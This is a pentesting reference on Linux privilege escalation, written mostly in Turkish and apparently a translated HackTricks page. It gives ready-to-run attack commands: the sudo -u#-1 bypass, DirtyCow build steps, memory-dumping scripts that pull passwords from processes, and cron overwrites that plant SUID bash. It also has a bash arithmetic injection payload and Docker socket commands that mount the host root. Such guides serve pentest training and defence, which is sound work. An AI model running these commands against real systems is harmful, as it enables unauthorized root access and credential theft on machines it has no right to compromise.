# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan işletim sistemi hakkında bazı bilgiler edinmeye başlayalım.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkeninin içindeki herhangi bir dizin üzerinde yazma izinlerine sahipseniz** bazı kütüphaneleri veya ikili dosyaları ele geçirebilirsiniz:
```bash
echo $PATH
```
### Ortam bilgisi

Ortam değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version'ı kontrol edin ve escalate privileges için kullanılabilecek herhangi bir exploit olup olmadığını kontrol edin
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir vulnerable kernel listesi ve bazı **compiled exploits** içeren örnekleri şurada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

O web sitesinden tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploitlerini aramak için yardımcı olabilecek araçlar şunlardır:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**; belki kernel sürümünüz bazı kernel exploit'lerinde belirtilmiştir ve böylece bu exploit'in geçerli olduğundan emin olabilirsiniz.

### CVE-2016-5195 (DirtyCow)

Linux Yetki Yükseltme - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Şu dosyada görünen savunmasız sudo sürümlerine dayanarak:
```bash
searchsploit sudo
```
sudo sürümünün savunmasız olup olmadığını bu grep ile kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız oldu

Bu vuln'ün nasıl istismar edilebileceğine dair bir **örnek** için **smasher2 box of HTB**'ye bakın.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleyin

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Diskler

Hangi şeylerin **mounted ve unmounted** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey unmounted ise, onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Yararlı yazılımlar

Yararlı ikili dosyaları listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını** kontrol edin. Bu, kernel exploit kullanmanız gerekirse faydalıdır çünkü kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zayıf Yazılımlar Yüklü

Yüklü paketlerin ve servislerin **sürümünü** kontrol edin. Belki eski bir Nagios sürümü (örneğin) vardır; bu sürüm escalating privileges için istismar edilebilir…\
Daha şüpheli görünen yüklü yazılımların sürümlerinin elle kontrol edilmesi önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Makineye SSH erişiminiz varsa, makine içinde yüklü olan eski ve zafiyetli yazılımları kontrol etmek için **openVAS** kullanabilirsiniz.

> [!NOTE] > _Bu komutlar çoğunlukla büyük oranda işe yaramayacak çok fazla bilgi gösterecektir; bu nedenle yüklü herhangi bir yazılım sürümünün bilinen exploit'lere karşı savunmasız olup olmadığını kontrol eden OpenVAS veya benzeri uygulamaların kullanılması önerilir._

## İşlemler

**Hangi işlemlerin** çalıştırıldığını inceleyin ve herhangi bir işlemin olması gerekenden **daha fazla ayrıcalığa sahip olup olmadığını** kontrol edin (örneğin tomcat'in root olarak çalıştırılması?).
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Ayrıca işlemlerin ikili dosyaları üzerindeki ayrıcalıklarınızı kontrol edin; belki başkasınınkini üzerine yazabilirsiniz.

### Süreç izleme

İşlemleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sıkça çalıştırılan veya belirli gereksinimler karşılandığında yürütülen savunmasız süreçleri tespit etmek için çok faydalı olabilir.

### İşlem belleği

Bazı sunucu servisleri **kimlik bilgilerini açık metin olarak bellekte** saklayabilir.\
Normalde diğer kullanıcılara ait süreçlerin belleğini okumak için **root privileges** gerekir; bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha faydalıdır.\
Ancak, düzenli bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabileceğinizi unutmayın.

> [!WARNING]
> Günümüzde çoğu makine varsayılan olarak **ptrace'e izin vermez**, bu da ayrıcalıksız kullanıcınıza ait diğer süreçleri dump edemeyeceğiniz anlamına gelir.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid'ye sahip oldukları sürece tüm süreçler debug edilebilir. Bu ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: yalnızca ebeveyn süreç debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: ptrace kullanmak sadece admin'e izinlidir, çünkü CAP_SYS_PTRACE yetkisi gerektirir.
> - **kernel.yama.ptrace_scope = 3**: ptrace ile hiçbir süreç izlenemez. Bir kez ayarlandığında, ptracing'i yeniden etkinleştirmek için yeniden başlatma gerekir.

#### GDB

Örneğin bir FTP servisinin belleğine erişiminiz varsa Heap'i elde edip içindeki kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği (PID) için, **maps bir işlemin sanal adres alanı içinde belleğin nasıl eşlendiğini gösterir**; ayrıca **her eşlenen bölgenin izinlerini** gösterir. O **mem** pseudo dosyası **işlemin belleğini doğrudan açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve ofsetlerini biliriz. Bu bilgiyi kullanarak **mem dosyasında konumlanıp tüm okunabilir bölgeleri** bir dosyaya kaydederiz.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. Çekirdeğin sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubu tarafından okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump için linux

ProcDump, Windows için Sysinternals araç takımı içindeki klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. Edinmek için: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlemin belleğini dump etmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırabilir ve sahip olduğunuz işlemi dump edebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator işleminin çalıştığını görürseniz:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilirsiniz (farklı yolları bulmak için önceki bölümlere bakın: dump the memory of a process) ve memory içinde credentials arayın:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin) will **düz metin kimlik bilgilerini bellekten** and from some **iyi bilinen dosyalardan**. It requires root privileges to work properly.

| Özellik                                           | Süreç Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron görevleri

Herhangi bir zamanlanmış görevin zafiyetli olup olmadığını kontrol et. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsin (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misin? symlinks kullanabilir misin? root'un kullandığı dizine belirli dosyalar oluşturabilir misin?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, içinde _/etc/crontab_ şu PATH'ı bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Dikkat: "user" kullanıcısının /home/user üzerinde yazma iznine sahip olduğunu unutmayın_)

Eğer bu crontab içinde root kullanıcısı PATH ayarlamadan bir komut veya script çalıştırmaya çalışıyorsa. Örneğin: _* * * * root overwrite.sh_\
Böylece şu komutu kullanarak root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Eğer bir script root tarafından çalıştırılıyorsa ve bir komut içinde “**\***” varsa, bunu beklenmedik şeyler (ör. privesc) yapmak için exploit edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard bir yolun öncesinde yer alıyorsa, örneğin** _**/some/path/\***_**, zafiyete açık değildir (hatta** _**./\***_ **de değildir).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içinde aritmetik değerlendirmeden önce parameter/variable expansion ve command substitution uygular. Eğer root bir cron/parser güvensiz log alanlarını okuyup bunları bir arithmetic context'e veriyorsa, saldırgan $(...) biçiminde bir command substitution enjekte edebilir ve cron çalıştığında bu root olarak çalışır.

- Neden çalışır: Bash'te genişletmeler şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, sonra word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), sonra kalan sayısal `0` aritmetikte kullanılır ve script hata olmadan devam eder.

- Tipik zafiyet örüntüsü:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- İstismar: Parse edilen log'a saldırgan kontrollü metin yazdırın öyle ki sayısal görünen alan bir command substitution içersin ve bir rakamla bitsin. Komutunuzun stdout'a yazmadığından emin olun (veya çıktıyı yönlendirin) ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer root tarafından çalıştırılan bir **cron script'ini değiştirebiliyorsanız**, çok kolay bir shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script bir **tam erişime sahip olduğunuz directory** kullanıyorsa, o folder'ı silmek ve **başka bir folder'a symlink oluşturmak** (sizin kontrolünüzdeki bir script'i sunmak için) faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Sık cron jobs

Process'leri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan process'leri arayabilirsiniz. Belki bundan faydalanıp escalate privileges elde edebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izle**, **en az çalıştırılan komutlara göre sırala** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu, başlayan her süreci izler ve listeler).

### Görünmez cronjob'lar

Bir yoruma **bir carriage return ekleyerek** (yeni satır karakteri olmadan) cronjob oluşturmak mümkündür ve cronjob çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamayacağınızı kontrol edin; yazabiliyorsanız, bunu **değiştirebilirsiniz** böylece servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unuz **çalıştırılır** (belki makinenin yeniden başlatılmasını beklemeniz gerekir).\
Örneğin .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile backdoor'unuzu oluşturun

### Yazılabilir servis ikili dosyaları

Unutmayın ki servisler tarafından çalıştırılan ikili dosyalar üzerinde **yazma iznine sahipseniz**, bunları backdoors için değiştirebilirsiniz; böylece servisler yeniden çalıştırıldığında backdoors çalıştırılır.

### systemd PATH - Relative Paths

**systemd** tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **write** yazabildiğinizi fark ederseniz, **escalate privileges** elde etme ihtimaliniz olabilir. Servis yapılandırma dosyalarında kullanılan **relative paths being used on service configurations** gibi öğeleri aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörü içine, **executable** ile **same name as the relative path binary** aynı ada sahip bir dosya oluşturun ve servis savunmasız eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **backdoor**'unuz çalıştırılacaktır (ayrıcalıksız kullanıcılar genellikle servisleri başlatamaz/durduramaz ama `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Servisler hakkında daha fazla bilgi için `man systemd.service` komutuna bakın.**

## **Zamanlayıcılar**

**Timers** are systemd unit files whose name ends in `**.timer**` that control `**.service**` files or events. **Timers** can be used as an alternative to cron as they have built-in support for calendar time events and monotonic time events and can be run asynchronously.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Bir timer'ı değiştirebiliyorsanız, var olan systemd.unit birimlerinden bazılarını (ör. bir `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şöyle açıklanıyor:

> Zamanlayıcı sona erdiğinde etkinleştirilecek birim. Argüman, son eki ".timer" olmayan bir birim adıdır. Belirtilmezse, bu değer varsayılan olarak zamanlayıcı birimiyle aynı ada sahip, sadece son eki farklı olan bir servis olur. (Yukarıya bakınız.) Etkinleştirilen birim adı ile zamanlayıcı biriminin adı, son ek dışında aynı isimde olmaları tavsiye edilir.

Bu nedenle, bu izni kötüye kullanmak için şunlara ihtiyacınız olur:

- Yazılabilir bir binary çalıştıran bazı systemd unit'leri (ör. `.service`) bulun
- Göreli bir yol (relative path) çalıştıran ve **systemd PATH** üzerinde **yazma ayrıcalıklarınızın** olduğu bir systemd unit bulun (o executable'ı taklit etmek için)

**Zamanlayıcılar hakkında daha fazla bilgi için `man systemd.timer`'ı inceleyin.**

### **Zamanlayıcıyı Etkinleştirme**

Bir zamanlayıcıyı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Not: **timer**, `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` konumunda ona bir symlink oluşturarak **etkinleştirilir**

## Soketler

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makinelerde **işlem iletişimi** sağlar. Bilgisayarlar arası iletişim için standart Unix dosya tanımlayıcılarını kullanırlar ve `.socket` dosyaları aracılığıyla yapılandırılırlar.

Soketler `.socket` dosyaları kullanılarak yapılandırılabilir.

**`man systemd.socket` ile soketler hakkında daha fazla bilgi edinin.** Bu dosya içinde birkaç ilginç parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ancak özetle **soketin nerede dinleyeceğini belirtmek** için kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 ve/veya port numarası, vb.)
- `Accept`: Booleansal bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance başlatılır** ve yalnızca bağlantı soketi ona aktarılır. Eğer **false** ise, tüm dinleme soketleri doğrudan **başlatılan service unit'a aktarılır**, ve tüm bağlantılar için yalnızca bir service unit oluşturulur. Bu değer, tek bir service unit'un koşulsuz olarak tüm gelen trafiği yönettiği datagram soketleri ve FIFO'lar için göz ardı edilir. **Varsayılan olarak false**. Performans nedenleriyle, yeni daemon'ların yalnızca `Accept=no` için uygun şekilde yazılması tavsiye edilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar sırasıyla dinleme **sockets**/FIFO'lar **oluşturulup** ve bağlanmadan **önce** veya **sonra** **çalıştırılır**. Komut satırının ilk belirteci mutlak bir dosya adı olmalı, ardından işlem için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFO'lar **kapatılıp** ve kaldırılmadan **önce** veya **sonra** **çalıştırılan** ek komutlardır.
- `Service`: **gelen trafik** üzerinde **etkinleştirilecek** service unit adını belirtir. Bu ayar yalnızca Accept=no olan soketler için izinlidir. Varsayılan olarak, soketle aynı ada sahip (sonek değiştirilmiş) service kullanılır. Çoğu durumda bu seçeneği kullanmak gerekli değildir.

### Yazılabilir .socket dosyaları

Eğer bir **yazılabilir** `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir şey **ekleyebilir** ve backdoor, soket oluşturulmadan önce çalıştırılacaktır. Bu yüzden **muhtemelen makinenin yeniden başlatılmasını beklemeniz gerekecektir.**\
_Sistemin bu socket dosyası yapılandırmasını kullanıyor olması gerektiğini unutmayın; aksi takdirde backdoor çalıştırılmaz_

### Yazılabilir soketler

Eğer herhangi bir **yazılabilir socket** tespit ederseniz (_şu an burada yapılandırma `.socket` dosyalarından değil, Unix Sockets'tan bahsediyoruz_), o soket ile **iletişim kurabilir** ve belki bir zafiyeti keşfedip istismar edebilirsiniz.

### Unix Soketlerini Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Sömürme örneği:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Bazı **sockets listening for HTTP** requests olabileceğini unutmayın (_I'm not talking about .socket files but the files acting as unix sockets_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer soket **responds with an HTTP** request ise, onunla **communicate** edebilir ve belki de bazı **exploit some vulnerability** gerçekleştirebilirsiniz.

### Yazılabilir Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir durumdadır. Bu sokete yazma erişimine sahip olmak privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceğinin ve Docker CLI mevcut değilse alternatif yöntemlerin bir dökümü bulunmaktadır.

#### **Privilege Escalation with Docker CLI**

Docker socket'e yazma erişiminiz varsa, aşağıdaki komutları kullanarak escalate privileges yapabilirsiniz:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişimi olan bir container çalıştırmanızı sağlar.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI mevcut değilse, Docker socket yine de Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir image'ların listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin root dizinini mount eden bir container oluşturmak için bir istek gönderin.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container'a bağlantı kurun, bu sayede içinde komut çalıştırabilirsiniz.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişimle doğrudan container içinde komut çalıştırabilirsiniz.

### Diğerleri

docker socket üzerinde yazma izinleriniz varsa çünkü **inside the group `docker`** içindeyseniz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, modern Linux sistemi göz önünde bulundurularak tasarlanmış, uygulamaların verimli bir şekilde etkileşim kurup veri paylaşmasını sağlayan sofistike bir **inter-Process Communication (IPC) system**dür. Farklı uygulama iletişim biçimlerine yönelik sağlam bir çatı sunar.

Sistem, süreçler arası veri alışverişini geliştiren temel IPC'yi destekleyerek **enhanced UNIX domain sockets** benzeri bir işlevsellik sağlar. Ayrıca olay veya sinyal yayınlamaya yardımcı olarak sistem bileşenlerinin entegrasyonunu kolaylaştırır — örneğin bir Bluetooth daemon'undan gelen çağrı sinyali bir müzik oynatıcısını sessize aldırabilir. Ayrıca D-Bus, uygulamalar arasında servis taleplerini ve yöntem çağrılarını basitleştiren bir remote object system destekler; bu, geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, bir **allow/deny model**i üzerinde çalışır; mesaj izinlerini (method calls, signal emissions, vb.) eşleşen politika kurallarının kümülatif etkisine göre yönetir. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin kötüye kullanılması yoluyla privilege escalation'a izin verebilir.

